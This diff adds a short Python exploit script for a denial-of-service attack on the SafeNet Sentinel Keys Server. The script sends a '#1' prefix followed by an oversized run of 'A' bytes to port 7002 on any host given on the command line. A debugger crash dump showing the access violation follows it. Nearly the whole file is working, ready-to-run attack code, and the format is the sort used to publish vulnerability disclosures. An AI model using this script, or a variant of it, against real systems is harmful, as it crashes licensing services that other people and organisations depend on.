@@ -1,0 +1,38 @@
+# Exploit Title: SafeNet Sentinel Keys Server DoS 
+# Date: 10 Sep 2012
+# Exploit Author:  retset (https://twitter.com/ret5et)
+# Vendor Homepage: http://www.safenet-inc.com/ 
+# Version: Sentinel Protection Installer  v7.6.5 (sntlkeyssrvr.exe ver. 1.3.1.3)
+# Download link: http://c3.safenet-inc.com/downloads/8/0/804F8C5F-F88F-4443-8871-2AD993DC33DB/Sentinel%20Protection%20Installer%207.6.5.exe
+# Download link: http://www.safenet-inc.com/support-downloads/sentinel-drivers/ 
+# Tested on: Xp Sp3
+
+import socket
+import sys
+
+if len(sys.argv) < 2:
+	print "usage: %s host"  % sys.argv[0]
+	sys.exit(0)
+
+host = sys.argv[1]
+print host
+req  = "#1"
+req += 'A' *0x4093
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,7002))
+s.send(req)
+s.close()
+
+
+"""
+(5ec.6f0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=0045011c ecx=00000003 edx=00b6bf83 esi=00b70000 edi=0045011c
+eip=0040f89b esp=00b65864 ebp=0000407d iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\Common Files\SafeNet Sentinel\Sentinel Keys Server\sntlkeyssrvr.exe
+sntlkeyssrvr+0xf89b:
+0040f89b f3a6            repe cmps byte ptr [esi],byte ptr es:[edi]
+"""
